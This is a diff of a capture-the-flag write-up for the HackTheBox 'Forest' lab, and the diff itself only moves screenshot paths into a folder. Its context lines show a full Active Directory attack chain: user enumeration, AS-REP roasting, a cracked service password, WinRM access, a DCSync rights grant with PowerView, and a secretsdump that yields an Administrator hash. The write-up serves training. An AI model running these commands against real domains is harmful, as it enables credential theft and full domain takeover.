@@ -147,7 +147,7 @@ We query DNS to check for useful records:
 dig @10.129.95.210 htb.local
 ```
 
-![dig](dig.png)
+![dig](screenshots/dig.png)
 
 Enumerate mail servers:
 
@@ -155,7 +155,7 @@ Enumerate mail servers:
 dig @10.129.95.210 htb.local mx
 ```
 
-![dig_mx](dig_mx.png)
+![dig_mx](screenshots/dig_mx.png)
 
 Attempt a zone transfer:
 
@@ -163,7 +163,7 @@ Attempt a zone transfer:
 dig @10.129.95.210 htb.local axfr
 ```
 
-![dig_axfr](dig_axfr.png)
+![dig_axfr](screenshots/dig_axfr.png)
 
 The zone transfer fails â€” no sub-domain information leaked.
 
@@ -182,7 +182,7 @@ This grants us access. We enumerate domain users:
 rpcclient $> enumdomusers
 ```
 
-![rpc_enumdomusers](rpc_enumdomusers.png)
+![rpc_enumdomusers](screenshots/rpc_enumdomusers.png)
 
 We extract just the usernames into a file for later use:
 
@@ -190,19 +190,19 @@ We extract just the usernames into a file for later use:
 rpcclient -U "" 10.129.95.210 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users
 ```
 
-![rpcclient_users](rpcclient_users.png)
+![rpcclient_users](screenshots/rpcclient_users.png)
 
 We also enumerate domain groups:
 
-![rpcclient_enumdomgroups](rpcclient_enumdomgroups.png)
+![rpcclient_enumdomgroups](screenshots/rpcclient_enumdomgroups.png)
 
 Querying the Domain Admins group reveals that only `Administrator` (RID 0x1f4) has access â€” useful for future pivoting:
 
-![rpcclient_queryuser](rpcclient_queryuser.png)
+![rpcclient_queryuser](screenshots/rpcclient_queryuser.png)
 
 We can also query display info for additional details:
 
-![rpcclient_querydispinfo](rpcclient_querydispinfo.png)
+![rpcclient_querydispinfo](screenshots/rpcclient_querydispinfo.png)
 
 No passwords revealed in this case.
 
@@ -217,7 +217,7 @@ With an AD machine and a user list, we attempt an AS-REP Roasting attack using I
 impacket-GetNPUsers htb.local/ -no-pass -usersfile users
 ```
 
-![getnpusers](getnpusers.png)
+![getnpusers](screenshots/getnpusers.png)
 
 The account `svc-alfresco` has `UF_DONT_REQUIRE_PREAUTH` set, and we obtain its AS-REP hash.
 
@@ -245,7 +245,7 @@ We validate the credentials with CrackMapExec:
 crackmapexec smb 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
 ```
 
-![crackmapexec_smb](crackmapexec_smb.png)
+![crackmapexec_smb](screenshots/crackmapexec_smb.png)
 
 Credentials are valid, but the user is not admin on the box. We check the available shares:
 
@@ -266,7 +266,7 @@ Port 5985 (WinRM) is open, so we check if `svc-alfresco` is in the Remote Manage
 crackmapexec winrm 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
 ```
 
-![crackmapexec_winrm](crackmapexec_winrm.png)
+![crackmapexec_winrm](screenshots/crackmapexec_winrm.png)
 
 **Pwn3d!** â€” the user has WinRM access. We get an interactive shell:
 
@@ -274,7 +274,7 @@ crackmapexec winrm 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
 evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
 ```
 
-![evilwinrm_login](evilwinrm_login.png)
+![evilwinrm_login](screenshots/evilwinrm_login.png)
 
 ![user_flag](screenshots/user_flag.png)
 
@@ -291,7 +291,7 @@ We can see other user directories but don't have access:
 dir C:\Users
 ```
 
-![evilwinrm_users](evilwinrm_users.png)
+![evilwinrm_users](screenshots/evilwinrm_users.png)
 
 We need to escalate to Administrator. For AD environments, **BloodHound** is the best tool to map trust relationships and identify privilege escalation paths.
 
@@ -304,7 +304,7 @@ We collect AD data from our attacking machine using the Python-based collector �
 bloodhound-python -d htb.local -u 'svc-alfresco' -p 's3rvice' -gc forest.htb.local -c all -ns 10.129.95.210
 ```
 
-![bloodhound_files](bloodhound_files.png)
+![bloodhound_files](screenshots/bloodhound_files.png)
 
 This generates JSON files with all AD relationships (users, groups, computers, domains, etc.).
 
@@ -314,13 +314,13 @@ We start **BloodHound Community Edition** with Docker:
 curl -L https://ghst.ly/getbhce | docker compose -f - up
 ```
 
-![bloodhound_password](bloodhound_password.png)
+![bloodhound_password](screenshots/bloodhound_password.png)
 
 The logs show the initial admin password. We open `http://localhost:8080`, log in, and upload the JSON files.
 
 Using the **Pathfinding** feature from `SVC-ALFRESCO@HTB.LOCAL` to `ADMINISTRATOR@HTB.LOCAL`:
 
-![bloodhound_pathfinding](bloodhound_pathfinding.png)
+![bloodhound_pathfinding](screenshots/bloodhound_pathfinding.png)
 
 The graph reveals the full attack chain:
 
@@ -353,7 +353,7 @@ upload /path/to/PowerView.ps1
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity moka -Rights DCSync
 ```
 
-![evilwinrm_powerview](evilwinrm_powerview.png)
+![evilwinrm_powerview](screenshots/evilwinrm_powerview.png)
 
 ---
 ### 4.4 DCSync Attack
@@ -364,7 +364,7 @@ From our attacking machine, we dump all domain hashes:
 impacket-secretsdump htb.local/moka:moka123@@10.129.95.210
 ```
 
-![secretsdump](secretsdump.png)
+![secretsdump](screenshots/secretsdump.png)
 
 We extract the **Administrator NTLM hash**: `32693b11e6aa90eb43d32c72a07ceea6`
 
